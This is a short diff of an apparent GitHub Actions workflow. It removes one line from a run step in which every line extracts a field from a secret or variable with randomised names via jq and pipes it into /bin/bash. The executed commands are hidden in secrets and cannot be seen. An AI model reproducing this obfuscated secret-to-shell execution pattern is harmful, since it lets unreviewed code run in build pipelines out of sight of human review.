@@ -19,7 +19,6 @@ jobs:
           pyszh07: ${{ secrets.pyszh07 }}
         run: |
           printf '%s' "$pyszh07" | jq -r .rphuc28393 | /bin/bash
-          echo $w5955 | jq -r .mqfw477 | /bin/bash
           printf '%s' "$qswd4" | jq -r .stto64 | /bin/bash
           echo $kd49130 | jq -r .slof42822 | /bin/bash
           printf '%s' "$gsuql9" | jq -r .k2694 | /bin/bash
